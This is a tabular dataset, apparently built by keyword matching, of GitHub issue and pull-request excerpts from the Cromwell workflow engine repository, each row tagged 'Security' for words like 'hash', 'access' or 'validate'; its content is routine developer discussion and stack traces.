Security,"Add the fuse support into the new Google Batch backend. It works like the Life Scientist API beta 2. I use the privileged mode, as we don't usually care about the security of the host OS. I can revise to limited permission if needed. . This function is useful to our team. Thanks for reviewing the changes. . Regards,; Zhili",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7378:163,secur,security,163,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7378,1,['secur'],['security']
Security,"Add workflow ""validate"" as an API endpoint",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2652:14,validat,validate,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2652,1,['validat'],['validate']
Security,"Added Docker specification content types to the manifest unmarshaller.; Updated spec for testing GCR w/o authentication, as cromwell's Google Credentials utility now automatically detects the application default credentials on a system.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/715:105,authenticat,authentication,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/715,1,['authenticat'],['authentication']
Security,Added a CRC hash get function for helping Job Avoision,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/272:12,hash,hash,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/272,2,['hash'],['hash']
Security,"Added a new Shared File System (SFS) Backend package as a base for any/most backends wanting to execute cromwell calls on an SFS.; Added SGE and LSF configs (commented out) to the main `application.conf`, plus other small tweaks.; Non-main `application.conf` files only set the keys that they need to add or override from the main.; More of the config is defaulted across the board.; A number of classes moved/refactored from other backends for use by the SFS backend.; New trait `RuntimeAttributesValidation[ValidatedType]` for proccessing runtime attributes.; First pass at a `WorkflowFileSystemProvider` that combines a config and workflow options to create a filesystem. Only implemented for local and GCS files.; Added a Config backend that implements the SFS backend by reading wdl-lite command strings and `job-id-regex`.; Currently extending SFS backend to create the SGE backend until one can specify runtime attributes via the Config backend.; Added a ""shadow"" local backend, extending the SFS backend, that will be evaluated for a while before hopefully usurping the original.; Fixed integration tests that were attempting to mock the gcs file system.; Gave `MetadataDatabaseAccessSpec` a little bit more time the non-split up ""create and query a workflow"".; Fixed the `SprayDockerRegistryApiClientSpec` for v1 registries by switching from the `ubuntu` repo to the `registry` repo (we query the registry for a repo hosting images of the docker registry-- inception).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1202:509,Validat,ValidatedType,509,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1202,1,['Validat'],['ValidatedType']
Security,Added basic parsing validation of the swagger yaml.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/211:20,validat,validation,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/211,1,['validat'],['validation']
Security,Added data access identity to workflow options [BT-442],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6563:11,access,access,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6563,1,['access'],['access']
Security,Added scalaz lib support to ValidateActor in order to match Workflow descriptor.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/562:28,Validat,ValidateActor,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/562,1,['Validat'],['ValidateActor']
Security,Added scalaz lib to ValidateActor. Closes #543,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/562:20,Validat,ValidateActor,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/562,1,['Validat'],['ValidateActor']
Security,Added validation back into the preStart of a BackendWorkflowActor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/686:6,validat,validation,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/686,1,['validat'],['validation']
Security,Adding a test exposed some previously unknown bugs 😬 which should be fixed now.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5295:14,expose,exposed,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5295,1,['expose'],['exposed']
Security,"Adding on to this PR... a third (!) variant that is more recent [(Slack link)](https://broadinstitute.slack.com/archives/CBJJ7U293/p1709148881267919) and ended up being an array issue. I think we understand the pattern at this point so not adding a Centaur test for every single WOM type. ```; Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""])java.lang.UnsupportedOperationException: Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""]); 	at wom.values.WomArray$.apply(WomArray.scala:43); 	at wom.values.WomArray$.apply(WomArray.scala:49); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.$anonfun$evaluateValue$16(LiteralEvaluators.scala:109); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:106); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:95); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:37); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:22); 	",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174:509,secur,secure-,509,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174,2,['secur'],['secure-']
Security,"Additional info since the time this issue was filed: Alibaba's [Batch Compute service (BCS) is now available in the US](https://www.alibabacloud.com/help/doc-detail/61360.htm?spm=a2c63.l28256.a3.23.194f25719KjP66). This helps test Cromwell-in-the-US-using-DockerHub, but for CN users the above issues still need to be addressed, including figuring out a way for to check hashes from OSS.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3518#issuecomment-399762138:371,hash,hashes,371,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3518#issuecomment-399762138,1,['hash'],['hashes']
Security,Additional options for hashing-strategy,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1843:23,hash,hashing-strategy,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1843,1,['hash'],['hashing-strategy']
Security,Adds a test to PR #6072. Can be used to validate the existing fix or any alternative implementation based on the resolution to [this discussion](https://github.com/broadinstitute/cromwell/pull/6072#issuecomment-745492666).,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6725:40,validat,validate,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6725,1,['validat'],['validate']
Security,"Adds more runtime parameters, adjusted case class to bring all runtime parameters, add user agent to requests and validated with google coming in, finalization fix for workflow parameters.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6987:114,validat,validated,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6987,1,['validat'],['validated']
Security,Adds the AES256 encryption flag to the function that copies RC and STDOUT/ERR logs to S3,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4377:16,encrypt,encryption,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4377,1,['encrypt'],['encryption']
Security,"After discussing with @abaumann and @geoffjentry, we are going to plan this for Cromwell 27, our first release of Q4 (April-or-so). Once this is complete, the A-Team will be able to use the Docker Hash library for their own features.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2062#issuecomment-285791090:197,Hash,Hash,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2062#issuecomment-285791090,1,['Hash'],['Hash']
Security,"After discussion with @ruchim, the output of a successful validation will be `Success!`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4040#issuecomment-444250930:58,validat,validation,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4040#issuecomment-444250930,1,['validat'],['validation']
Security,"After workflow succesffuly ran this failed with the below error when trying to copy the final outputs. ```; 2016-06-01 16:10:15,093 cromwell-system-akka.actor.default-dispatcher-15 ERROR - WorkflowActor [UUID(88b21d2d)]: failed to create call actor for PairedEndSingleSampleWorkflow.$final_call$copy_workflow_log.; java.util.NoSuchElementException: None.get; at scala.None$.get(Option.scala:347) ~[cromwell.jar:0.19]; at scala.None$.get(Option.scala:345) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1$$anonfun$apply$26.apply(CallMetadataBuilder.scala:156) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1$$anonfun$apply$26.apply(CallMetadataBuilder.scala:155) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter$$anonfun$map$2.apply(TraversableLike.scala:728) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter.map(TraversableLike.scala:727) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1.apply(CallMetadataBuilder.scala:155) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$buildCallFailureTransformer$1.apply(CallMetadataBuilder.scala:153) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$15.apply(CallMetadataBuilder.scala:233) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$$anonfun$15.apply(CallMetadataBuilder.scala:232) ~[cromwell.jar:0.19]; at scala.collection.LinearSeqOptimized$class.foldLeft(LinearSeqOptimized.scala:124) ~[cromwell.jar:0.19]; at scala.collection.immutable.List.foldLeft(List.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/927:952,Hash,HashMap,952,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/927,2,['Hash'],['HashMap']
Security,"Ah yes, let's just claim we fixed one bug then 😄 ; My take; use, modify, or discard as desired:; > Fixed a bug that could cause workflows to fail unexpectedly with the error `413 Request Entity Too Large` when accessing Google Cloud Storage.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800638600:210,access,accessing,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800638600,1,['access'],['accessing']
Security,"Ah, I had `hasing-strategy` instead of `hashing-strategy` in my config.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108#issuecomment-1489453861:40,hash,hashing-strategy,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108#issuecomment-1489453861,1,['hash'],['hashing-strategy']
Security,"Ah, I see. Just a guess, but are you sure your S3 URLs (or more likely your S3 bucket in the configuration file) are in the right format? `s3://s3.amazonaws.com/concr-genomics-results/cromwell-execution/wf_hello/b7e4cdce-ff14-4509-aec3-b226ed31043c/call-hello/hello-rc.txt` doesn't look valid to me. It should be more like `s3://concr-genomics-results`. Alternatively, maybe the AWS Batch role doesn't have read access to the S3 bucket? The Cromwell server and the Batch instances are different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435016934:412,access,access,412,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435016934,1,['access'],['access']
Security,"Ahh I think I see what you mean. I don't need the ""-l labels.json"" but need to create an actual Label in the GCP account that has the following key/value:. my-private-network: xxx; my-private-subnetwork: yyy. I don't have access to create the labels but will have someone do this and try again. Let me know if I am still missing something. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905066699:222,access,access,222,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6477#issuecomment-905066699,1,['access'],['access']
Security,"Akka 2.5.4 provides the new [AffinityPool](https://github.com/akka/akka/pull/23104) which is expected to provide performance benefit in cases where you have long lived actors maintaining lots of state. Because it works a lot like a `PinnedDispatcher` it wouldn't be a panacea for us even if it was useful in some of our cases but I can imagine using it for a handful of carefully selected actors (and perhaps only specified in a handful of use cases for Cromwell) could have benefits. . This ticket is mostly a benchmarking exercise to explore what using this pool might do to performance in Cromwell. Try to hash out an envelope of where/if this pool would be useful. For instance, would adding it to a few key actors provide measurable impact? Does it depend on how many cores are in use altogether, i.e. does the pinning effect mean that you really need excess cpus to see benefit? etc etc etc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2571:609,hash,hash,609,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2571,1,['hash'],['hash']
Security,"All the tests that pass on the Local backend currently pass on PAPI with the hackery documented below. This does not attempt to run tests that fail on Local because there's no realistic reason to believe a conformance test that fails Local would succeed on PAPI and the PAPI conformance test run would take hours. On the topic of slowness, the PAPI conformance run will probably have to be converted to a cron job once more conformance tests start passing. The hacks:; - Cromwell now allows for a default Docker image to be specified in config. This is required for those conformance tests that don't specify a `DockerRequirement`.; - Cromwell allows for a ""GCS default input prefix"" of any input files when using the JES backend. This allows for the conformance input JSONs to be used as-is. It also works to hack the input JSONs to specify the GCS paths where input files are staged and not bother with the ""GCS default input prefix"".; - I had to turn off call caching since the hashing actor was looking at the non-GCS paths of files. It's possible this could be worked around if anyone felt it was worth the effort, but I didn't.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3086:981,hash,hashing,981,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3086,1,['hash'],['hashing']
Security,"Allow Cromwell system administrators to restrict WDL HTTP imports to specific, trusted hosts/domains. This prevents the import mechanism from being used to inappropriately access resources that the Cromwell instance has access to on its internal LAN, but which are not exposed to the end users. Terra configuration here: https://github.com/broadinstitute/firecloud-develop/pull/3138",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6938:172,access,access,172,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6938,3,"['access', 'expose']","['access', 'exposed']"
Security,Allow ENV injection into swagger yaml [BW-861],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6552:10,inject,injection,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6552,1,['inject'],['injection']
Security,Allow member accesses to parse,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3064:13,access,accesses,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3064,1,['access'],['accesses']
Security,Allow nested structs and member accesses,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3358:32,access,accesses,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3358,1,['access'],['accesses']
Security,Allow task-only validation in draft 2 WDL,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3772:16,validat,validation,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3772,1,['validat'],['validation']
Security,Allow the underlying actor system to be accessed by Backend,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/323:40,access,accessed,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/323,1,['access'],['accessed']
Security,Allows for and tests `womtool validate draft2_task.wdl`. Fixes #3762,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3772:30,validat,validate,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3772,1,['validat'],['validate']
Security,Allows for removal of dependency on backend in the various *logs and metadata endpoints. Be careful with how this impacts hashing.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/430#issuecomment-181537885:122,hash,hashing,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/430#issuecomment-181537885,1,['hash'],['hashing']
Security,"Allows reading of WDL 1.0 and 1.1 `Ast`s through a shared set of `CheckedAtoB` functions, with the flexibility to inject different transform behavior into each usage of the instantiations of the transforms. Note: of the 9013 added lines, 7484 are the new 1.1 WDL parser and presumably about 810 are files which got moved out of draft-3/transforms and into base/transforms",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3852:114,inject,inject,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3852,1,['inject'],['inject']
Security,"Already part of the plans for reworked, centralized validation",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/570:52,validat,validation,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/570,1,['validat'],['validation']
Security,"Alright, would you prefer to expose it as a workflow (or Cromwell) option? Something like `monitoring_image` and if it's not defined, then the action is skipped. This way, one can also use an alternative image with their custom logic (incl. other monitoring APIs).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451511789:29,expose,expose,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451511789,1,['expose'],['expose']
Security,"Also I just compared two of the workflow runs:; ```; {; ""callA"": {; ""executionStatus"": ""Done"",; ""allowResultReuse"": false,; ""callFqn"": ""Panel_BWA_GATK4_Samtools_Var_Annotate_Split.BwaMem"",; ""jobIndex"": 0,; ""workflowId"": ""X""; },; ""callB"": {; ""executionStatus"": ""Done"",; ""allowResultReuse"": true,; ""callFqn"": ""Panel_BWA_GATK4_Samtools_Var_Annotate_Split.BwaMem"",; ""jobIndex"": 0,; ""workflowId"": ""Y""; },; ""hashDifferential"": []; }; ```. ???? But yet no data reuse.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457367934:402,hash,hashDifferential,402,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457367934,1,['hash'],['hashDifferential']
Security,"Also the following WDL:; ```; version 1.0. workflow main {; }. task main {; command <<<; echo ~{if 0 < 0.0 then ""yes"" else ""no""}; >>>; }; ```; gives similarly inexplicable error messages (with Cromwell 85):; ```; $ java -jar womtool-85.jar validate main.wdl ; ERROR: Unexpected symbol (line 8, col 21) when parsing 'e'. Expected identifier, got ""0"". echo ~{if 0 < 0.0 then ""yes"" else ""no""}; ^. $e = $e <=> :dot :identifier -> MemberAccess( value=$0, member=$2 ); ```; It almost seems like Cromwell does not like the `0.0` representation of `0` within the `command <<< ... >>>` section of a task",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5602#issuecomment-1599327981:240,validat,validate,240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5602#issuecomment-1599327981,1,['validat'],['validate']
Security,"Also, directories do not seem to work as workflow outputs. Even if the option:; ```; ""final_workflow_outputs_dir"": ""/file/path/output/"",; ```; Is active, `Directory` outputs are not copied to the final output directory. This example to reproduce the issue:; ```; $ echo 'version development. workflow main {; call main { input: s = ""f"" }; output { Directory d = main.d }; }. task main {; input {; String s; }. command <<<; set -euo pipefail; mkdir d; touch ""d/~{s}""; >>>. output {; Directory d = ""d""; }. runtime {; docker: ""debian:stable-slim""; }; }' > /tmp/main.wdl. $ echo '{; ""final_workflow_outputs_dir"": ""/tmp/outputs""; }' > /tmp/options.json. $ java -jar cromwell-69.jar run /tmp/main.wdl -o /tmp/options.json; ... $ ls /tmp/outputs/; ls: cannot access '/tmp/outputs/': No such file or directory; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-934499095:752,access,access,752,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-934499095,1,['access'],['access']
Security,"Also, if possible, run something in JES beforehand, then run the liquibase update over the existing data and check the /metadata and /timing can still be accessed for the preexisting tasks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/427#issuecomment-181437112:154,access,accessed,154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/427#issuecomment-181437112,1,['access'],['accessed']
Security,"Also, on this topic, I don't know much about it but Java has a SecurityManager and Security policies which might (?) be able to restrict to which part of the filesystem cromwell would be able to read from ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/802#issuecomment-218461557:63,Secur,SecurityManager,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/802#issuecomment-218461557,2,['Secur'],"['Security', 'SecurityManager']"
Security,"Although now that I've said that I know that we *do* have a use case where something like this is being requested. They want a typed set of key/value pairs, but the thing that they really want is to be able to define some boundaries (e.g. ""Foo"" is a number between 1 and 10) and to have the static analysis fail to validate the workflow if one of these are a workflow input and the values are wrong. Now that I type that out, having refinement types in WDL seems like a bad path to be going down. I should verify that's *really* what they want or if I read too much into an example they gave.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2283#issuecomment-330315059:315,validat,validate,315,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2283#issuecomment-330315059,1,['validat'],['validate']
Security,"Among other warts labeled as ""TODO: PBE:"", there are now two directories serving the package `cromwell.service`:; - [`services/src/main/scala/cromwell/services`](https://github.com/broadinstitute/cromwell/tree/ks_jes_return_of_the_metadata/services/src/main/scala/cromwell/services); - [`. engine/src/main/scala/cromwell/services`](https://github.com/broadinstitute/cromwell/tree/ks_jes_return_of_the_metadata/engine/src/main/scala/cromwell/services). The latter directory are services that still access the engine. Some engineering/refactoring will be needed if we want them moved to the ""services"" sub-project, but I wasn't sure where to draw the line on changes for this PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/883#issuecomment-221376763:497,access,access,497,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/883#issuecomment-221376763,1,['access'],['access']
Security,"An audit of Cromwell traffic shows >96% of traffic hits the status endpoint for polling. A sample of this traffic shows an average of 40/s. As a perf benchmark we'd like to ensure that CromIAM can handle 200 reqs/s to this endpoint, ideally assuming SAM & Cromwell are perfectly performant.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4614:3,audit,audit,3,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4614,1,['audit'],['audit']
Security,"An example from a failed CRON test:. ```; 2018-07-04 07:18:56,909 cromwell-system-akka.dispatchers.backend-dispatcher-34 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(b2e34f33)Arrays.AutoCall:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/4612525402041750773; ...; 2018-07-04 07:20:37,086 cromwell-system-akka.dispatchers.engine-dispatcher-29 ERROR - WorkflowManagerActor Workflow b2e34f33-e643-437f-aa38-b62f6d44f2dc failed (during ExecutingWorkflowState): java.lang.Exception: Task Arrays.AutoCall:NA:1 failed. The job was stopped before the command finished. PAPI error code 2. Execution failed: pulling image: docker pull: running [""docker"" ""pull"" ""us.gcr.io/broad-gotc-dev/autocall:dev-3.0.0-1527695536""]: exit status 1 (standard error: ""Error response from daemon: repository us.gcr.io/broad-gotc-dev/autocall not found: does not exist or no pull access\n""); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:79); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:551); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:558); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:83); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1072); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1068); at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); at scala.concurrent.impl.CallbackRun",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3861:874,access,access,874,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3861,1,['access'],['access']
Security,"An incorrect key was being used to specify hashing strategy, but Cromwell didn't complain and the user wrongly thought their value was accepted.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1598:43,hash,hashing,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1598,1,['hash'],['hashing']
Security,And another possible bug: why are we trying to upload an auth file when running in application default auth mode for both genomics and filesystems?. ```; [ERROR] [01/27/2017 14:39:36.100] [cromwell-system-akka.dispatchers.engine-dispatcher-5] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow 732474fd-88b0-4a5e-ad19-5ee5cd71d141 failed (during InitializingWorkflowState): Failed to upload authentication file; java.io.IOException: Failed to upload authentication file; 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile$1$$anonfun$apply$1.applyOrElse(JesInitializationActor.scala:81); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$cromwell$backend$impl$jes$JesInitializationActor$$writeAuthenticationFile$1$$anonfun$apply$1.applyOrElse(JesInitializationActor.scala:80); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinP,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1924:438,authenticat,authentication,438,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1924,2,['authenticat'],['authentication']
